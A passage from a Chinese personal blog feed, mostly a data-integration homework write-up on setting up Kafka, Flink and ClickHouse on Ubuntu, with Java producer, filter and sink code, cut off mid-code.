    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/lol3.png" style="width: 32%; aspect-ratio: 1.7 / 1; border-radius: 8px; object-fit: cover; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/hearthstone.png" style="width: 32%; aspect-ratio: 1.7 / 1; border-radius: 8px; object-fit: cover; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/valorant.png" style="width: 32%; aspect-ratio: 1.7 / 1; border-radius: 8px; object-fit: cover; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);">
  </div>
</div>

<div style="display: grid; grid-template-columns: repeat(5, 1fr); gap: 20px; padding: 20px; background-color: #1b2838; border-top-left-radius: 0; border-top-right-radius: 0; border-bottom-left-radius: 12px; border-bottom-right-radius: 12px;">
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stwitcher3.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stslaythespire.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/staoe2.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/staoe4.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stbmw.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/streddead2.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stcbperpunk.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stnightmares2.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stquehun.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/strustylakeroots.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/sthollowknight.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stck3.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stcs.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stdetroit.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/sthorizon4.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stghostrunner.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stgtav.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stbattlefield5.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/stterraria.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/sttheyarebillions.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
</div>


<hr>
<p>无论是书籍、电影，还是游戏，它们都以各自独特的方式丰富了我们的生活。它们传递思想、触动情感，或是带来欢笑与思考。希望这些推荐能为你带来启发，点亮你的世界。</p>
]]></content>
  </entry>
  <entry>
    <title>数据集成-作业二</title>
    <url>/2024/12/15/%E6%95%B0%E6%8D%AE%E9%9B%86%E6%88%90-%E4%BD%9C%E4%B8%9A%E4%BA%8C/</url>
    <content><![CDATA[<p>完整项目链接：<a href="https://git.nju.edu.cn/bin/data-intergration/-/tree/main/homework2?ref_type=heads">homework2 · main · 垃圾桶 &#x2F; Data-Intergration · GitLab</a></p>
<h3 id="实时数据部分"><a href="#实时数据部分" class="headerlink" title="实时数据部分"></a>实时数据部分</h3><h4 id="一-环境配置"><a href="#一-环境配置" class="headerlink" title="一 环境配置"></a>一 环境配置</h4><p>​	操作系统使用ubuntu20.04</p>
<h5 id="1-jdk-1-8"><a href="#1-jdk-1-8" class="headerlink" title="1. jdk 1.8"></a>1. jdk 1.8</h5><p>​	官网下载openjdk1.8，解压至本地，添加环境变量，使用<code>java -version</code>检查。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214549210.png" alt="image-20241215214549210" style="zoom:67%;" />

<h5 id="2-kafka-2-11-2-1-0"><a href="#2-kafka-2-11-2-1-0" class="headerlink" title="2. kafka 2.11-2.1.0"></a>2. kafka 2.11-2.1.0</h5><p>​	官网下载Kafka包后，解压至本地，然后修改kafka&#x2F;config&#x2F;下的zookeeper.properties文件，将zookeeper端口设置为2291，并修改zookeeper日志存放地址，再修改server.properties文件，设置连接zookeeper地址为localhost:2291，并修改kafka日志地址。</p>
<span id="more"></span>

<p>​	在zookeeper.properties中：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214600302.png" alt="image-20241215214600302" style="zoom:67%;" />

<p>​	在server.properties中：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214616126.png" alt="image-20241215214616126" style="zoom:67%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214627136.png" alt="image-20241215214627136" style="zoom:67%;" />

<h5 id="3-flink-1-13-5"><a href="#3-flink-1-13-5" class="headerlink" title="3. flink 1.13.5"></a>3. flink 1.13.5</h5><p>​	官网下载flink包后（注意对应的scala版本为2.11），解压至本地，添加环境变量，使用<code>flink -v</code>检查。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214807360.png" alt="image-20241215214807360"></p>
<p>​	 运行<code>start-cluster.sh</code>命令启动flink，可以访问localhost:8081来查看flink web ui：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214816919.png" alt="image-20241215214816919" style="zoom: 80%;" />

<h5 id="4-clickhouse-23-2-4-12"><a href="#4-clickhouse-23-2-4-12" class="headerlink" title="4. clickhouse 23.2.4.12"></a>4. clickhouse 23.2.4.12</h5><p>​	对于clickhouse版本没有特别的要求，执行如下命令安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br><span class="line">sudo yum-config-manager --add-repo https://packages.clickhouse.com/rpm/clickhouse.repo //添加官方存储库</span><br><span class="line">sudo yum install -y clickhouse-server clickhouse-client //安装clickhouse-server和clickhouse-client</span><br><span class="line"></span><br><span class="line">sudo /etc/init.d/clickhouse-server start //启动clickhouse-server</span><br></pre></td></tr></table></figure>

<p>​	此时输入<code>clickhouse-client</code>应该就可以访问clickhouse了，默认使用default账户，正常创建密码即可。使用sql语句操作clickhouse，创建dm数据库，然后按照ch.sql这个文件创建各个表。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE dm</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> dm.dm_hlw_shop_info(....)...;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>​	其中以info结尾的为静态数据表，以mx结尾的为实时数据表，可以用以下命令查看各个表中的数据情况：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> database,name,total_rows <span class="keyword">FROM</span> system.tables <span class="keyword">WHERE</span> database <span class="operator">=</span> <span class="string">&#x27;dm&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​	然后这里配置的clickhouse是本地虚拟机内的，要想让远程主机访问并写入，还要做一个ip映射，并修改clickhouse访问权限。先使用<code>ifconfig</code>命令检查一下原来的ip，可以发现只有本地内网（10.0.2.15）。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214839318.png" alt="image-20241215214839318" style="zoom:67%;" />

<p>​	在virtualbox中设置网卡为桥接网卡，然后再查一次<code>ifconfig</code>，发现有了公网ip（172.31.56.66）：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214850602.png" alt="image-20241215214850602" style="zoom: 67%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214903499.png" alt="image-20241215214903499" style="zoom:67%;" />

<p>​	后面远程主机想连接这里的clickhouse使用这个地址 172.31.56.66:8123 即可。</p>
<p>​	然后再修改clickhouse的访问权限，打开&#x2F;etc&#x2F;clickhouse-server&#x2F;users.xml，将<acess_management>的注释去掉。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214919419.png" alt="image-20241215214919419" style="zoom:67%;" />

<p>​	使用postman测试一下：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215214927928.png" alt="image-20241215214927928" style="zoom:67%;" />

<h4 id="二-数据处理"><a href="#二-数据处理" class="headerlink" title="二 数据处理"></a>二 数据处理</h4><h5 id="1-接收Kafka流式数据"><a href="#1-接收Kafka流式数据" class="headerlink" title="1. 接收Kafka流式数据"></a>1. 接收Kafka流式数据</h5><p>​	在助教文档给的代码进行简单修改，将接收的数据写入csv文件中保存，并对接受速率进行简单的统计，代码省略。</p>
<p>​	实时接收助教推送时的速率大约为1000条&#x2F;s，当助教退完数据后再接收速率大约为10000-20000条&#x2F;s，共接受19.6G数据，简单统计后数据分布如下：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215009081.png" alt="image-20241215215009081" style="zoom:67%;" />

<p>​	小组组号为28，共收到25条特殊数据，如下（因为没有更改编码为utf-8，所以中文显示乱码）：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215020320.png" alt="image-20241215215020320" style="zoom:67%;" />

<h5 id="2-搭建Kafka生产者"><a href="#2-搭建Kafka生产者" class="headerlink" title="2.  搭建Kafka生产者"></a>2.  搭建Kafka生产者</h5><p>​	先在kafka2.11_2.1.0&#x2F;config&#x2F;中配置zookeeper为localhost:2181端口，kafka为localhost:9092端口，并设置好日志文件地址。</p>
<p>​	从csv文件中取数据，并进行生产，具体步骤为：</p>
<p>1）启动zookeeper和kafka，以下命令是前台启动（方便查看日志），也可以后台启动。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin/zookeeper-server-start.sh config/zookeeper.properties </span><br><span class="line">bin/kafka-server-start.sh config/server.properties</span><br></pre></td></tr></table></figure>

<p>2）创建kafka主题“kafka2flink”，表示数据将生产至该主题中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic kafka2flink</span><br></pre></td></tr></table></figure>

<p>3）运行kafka生产者代码，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取数据（即KafkaConsumer消费的数据），并用kafka进行生产</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KafkaProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        <span class="comment">//kafka 集群，broker-list</span></span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;acks&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="comment">//重试次数</span></span><br><span class="line">        props.put(<span class="string">&quot;retries&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//批次大小</span></span><br><span class="line">        props.put(<span class="string">&quot;batch.size&quot;</span>, <span class="number">16384</span>);</span><br><span class="line">        <span class="comment">//等待时间</span></span><br><span class="line">        props.put(<span class="string">&quot;linger.ms&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//RecordAccumulator 缓冲区大小</span></span><br><span class="line">        props.put(<span class="string">&quot;buffer.memory&quot;</span>, <span class="number">33554432</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serializati&quot;</span> +</span><br><span class="line">                <span class="string">&quot;on.StringSerializer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> Logger.getLogger(<span class="string">&quot;ProducerLogger&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">org</span>.apache.kafka.clients.producer.KafkaProducer&lt;&gt;(props)) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/home/jinqiqing/DI_data/data.csv&quot;</span>);</span><br><span class="line">            <span class="comment">//设置主题名，注意主题名要与前面创建的主题一致</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">topic</span> <span class="operator">=</span> <span class="string">&quot;kafka2flink&quot;</span>;</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(file));</span><br><span class="line">            <span class="comment">//批量生成数据</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">totalCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> bufferedReader.readLine();</span><br><span class="line">            <span class="keyword">while</span> (line != <span class="literal">null</span>) &#123;</span><br><span class="line">                ProducerRecord&lt;String, String&gt; record = <span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;&gt;(topic, line);</span><br><span class="line">                producer.send(record);</span><br><span class="line">                totalCount++;</span><br><span class="line">                line = bufferedReader.readLine();</span><br><span class="line">                <span class="keyword">if</span> ((totalCount % <span class="number">10000</span>) == <span class="number">0</span>)</span><br><span class="line">                    logger.info(<span class="string">&quot;hava produced data count = &quot;</span> + totalCount);</span><br><span class="line">            &#125;</span><br><span class="line">            logger.info(<span class="string">&quot;All data produced. Total count: &quot;</span> + totalCount);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	此时Kafka生产者开始生产数据，可以用以下命令验证是否生产成功（如果成功应该能消费到数据）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic kafka2flink --from-beginning</span><br></pre></td></tr></table></figure>

<h5 id="3-Flink消费kafka数据并写入clickhouse"><a href="#3-Flink消费kafka数据并写入clickhouse" class="headerlink" title="3.  Flink消费kafka数据并写入clickhouse"></a>3.  Flink消费kafka数据并写入clickhouse</h5><p>​	当启动Kafka生产者后，可以使用flink消费数据了，先启动flink：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-cluster.sh</span><br></pre></td></tr></table></figure>

<p>​	然后用<code>mvn clean package</code>将flink代码打包(需要带依赖打包，具体见下面pom.xml），使用flink命令行或上传至flink web ui（localhost:8081），设置好并行度和参数，然后点击submit执行（执行时需要确保zookeeper和kafka在运行）。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215040518.png" alt="image-20241215215040518" style="zoom:67%;" />

<p>​	flink web ui上显示如下表明正常运行：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215051545.png" alt="image-20241215215051545" style="zoom:67%;" />

<p>​	如果flink web ui的日志中报错提示：<em>No suitable driver found for jdbc:clickhouse</em>，这时由于找不到相关的依赖导致的，可以将&#x2F;usr&#x2F;local&#x2F;java&#x2F;jre&#x2F;lib&#x2F;rt.jar复制一份至flink&#x2F;lib&#x2F;中。</p>
<p>​	当消费完全部数据后，flink不会自动停止而是继续等待新的数据被生产，需要Cancel Job手动停止。</p>
<p>​	该部分在代码中具体处理步骤为：</p>
<p>1）定义FlinkKafkaConsumer，消费前面Kafka生产的数据，并添加至数据源，该部分代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StreamExecutionEnvironment</span> <span class="variable">env</span> <span class="operator">=</span> StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">      <span class="comment">// 设置Flink应用程序的检查点（checkpoint）间隔，每60000毫秒将发起一次检查点</span></span><br><span class="line">      env.enableCheckpointing(<span class="number">60000</span>);</span><br><span class="line">      <span class="comment">// 设置Flink应用程序的时间特征，在此代码中设置以事件时间(事件实际发生的时间)作为时间标记（而不是Flink默认的处理时间或摄取时间）</span></span><br><span class="line">      env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//设置主题名，表示从这个主题接收数据，即source，应该与KafkaProducer中的主题和前面命令行创建的主题对应</span></span><br><span class="line">      <span class="type">String</span> <span class="variable">topic</span> <span class="operator">=</span> <span class="string">&quot;kafka2flink&quot;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">      <span class="comment">//应该与KafkaProducer中kafka集群地址对应</span></span><br><span class="line">      props.setProperty(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">      <span class="comment">//相同的组号维护相同的offset，也就是只要组号不同，就不会重复读数据</span></span><br><span class="line">      props.setProperty(ConsumerConfig.GROUP_ID_CONFIG, <span class="string">&quot;203&quot;</span>);</span><br><span class="line">      <span class="comment">// 定义Flink Kafka Consumer</span></span><br><span class="line">      FlinkKafkaConsumer&lt;String&gt; consumer = <span class="keyword">new</span> <span class="title class_">FlinkKafkaConsumer</span>&lt;String&gt;(topic, <span class="keyword">new</span> <span class="title class_">SimpleStringSchema</span>(), props);</span><br><span class="line">      <span class="comment">// 设置第一次从头消费，以后从上一次的位置继续消费</span></span><br><span class="line">      consumer.setStartFromGroupOffsets();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加source数据流</span></span><br><span class="line">      DataStreamSource&lt;String&gt; source = env.addSource(consumer);</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>2）使用过滤函数对数据进行空值过滤，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对数据流，过滤空值</span></span><br><span class="line">SingleOutputStreamOperator&lt;String&gt; dataStream = source.map(<span class="keyword">new</span> <span class="title class_">FilterMapFunction</span>());</span><br></pre></td></tr></table></figure>

<p>​	其中，FilterMapFunction为自定义的过滤函数，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 过滤符合特定条件的JSON格式字符串。</span></span><br><span class="line"><span class="comment"> * 在重载的map函数中，将接收到的json字符串中的键值对进行判断，如果满足以下条件之一，则将其过滤掉：</span></span><br><span class="line"><span class="comment"> * uid的值为空；</span></span><br><span class="line"><span class="comment"> * 除uid外所有值都为空；</span></span><br><span class="line"><span class="comment"> * 所有值都为空。</span></span><br><span class="line"><span class="comment"> * 如果该json字符串未被过滤，则直接返回原字符串，否则返回null。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterMapFunction</span> <span class="keyword">implements</span> <span class="title class_">MapFunction</span>&lt;String, String&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">map</span><span class="params">(String json)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 判断json字符串是否为空</span></span><br><span class="line">        <span class="keyword">if</span> (json == <span class="literal">null</span> || json.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 解析json字符串为JSONObject对象</span></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONObject.parseObject(json);</span><br><span class="line">        <span class="comment">// 判断是否存在eventBody键</span></span><br><span class="line">        <span class="keyword">if</span> (!jsonObject.containsKey(<span class="string">&quot;eventBody&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取eventBody对象</span></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">eventBody</span> <span class="operator">=</span> jsonObject.getJSONObject(<span class="string">&quot;eventBody&quot;</span>);</span><br><span class="line">        <span class="comment">// 判断eventBody对象是否为空</span></span><br><span class="line">        <span class="keyword">if</span> (eventBody == <span class="literal">null</span> || eventBody.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断是否存在eventType键</span></span><br><span class="line">        <span class="keyword">if</span> (!jsonObject.containsKey(<span class="string">&quot;eventType&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断eventType键的值是否为空</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">eventType</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;eventType&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (eventType == <span class="literal">null</span> || eventType.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断uid键是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!eventBody.containsKey(<span class="string">&quot;uid&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取uid键的值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uid</span> <span class="operator">=</span> eventBody.getString(<span class="string">&quot;uid&quot;</span>);</span><br><span class="line">        <span class="comment">// 判断uid键的值是否为空</span></span><br><span class="line">        <span class="keyword">if</span> (uid == <span class="literal">null</span> || uid.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断eventBody中是否存在键的值不为空</span></span><br><span class="line">        <span class="keyword">for</span> (String key : eventBody.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (eventBody.get(key) != <span class="literal">null</span> &amp;&amp; !eventBody.getString(key).equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> json;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3）接下来将过滤后的数据依据不同的‘eventType’写入clickhouse对应的表中，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">MyClickhouseSink</span> <span class="variable">myClickhouseSink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClickhouseSink</span>(username,password,url,<span class="keyword">new</span> <span class="title class_">ClickhouseSqlHelper</span>(dataTypeMap,columnNameListMap));</span><br><span class="line">dataStream.addSink(myClickhouseSink);</span><br></pre></td></tr></table></figure>

<p>其中，MyClickhouseSink代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClickhouseSink</span> <span class="keyword">extends</span> <span class="title class_">RichSinkFunction</span>&lt;String&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Connection connection;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String url;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">batchSize</span> <span class="operator">=</span> <span class="number">5000</span>; <span class="comment">//每积累5000条推送至clickhouse一次</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,PreparedStatement&gt; prepareStatementMap;</span><br><span class="line">    PreparedStatement lastPrepareStatement;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClickhouseSqlHelper clickhouseSqlHelper;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClickhouseSink</span><span class="params">(String username, String password, String url, ClickhouseSqlHelper clickhouseSqlHelper)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;<span class="built_in">this</span>.password = password;<span class="built_in">this</span>.url = url;<span class="built_in">this</span>.clickhouseSqlHelper = clickhouseSqlHelper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>.open(parameters);</span><br><span class="line">        Class.forName(<span class="string">&quot;ru.yandex.clickhouse.ClickHouseDriver&quot;</span>);</span><br><span class="line">        connection = DriverManager.getConnection(url, username, password);</span><br><span class="line">        prepareStatementMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String simpleTableName: 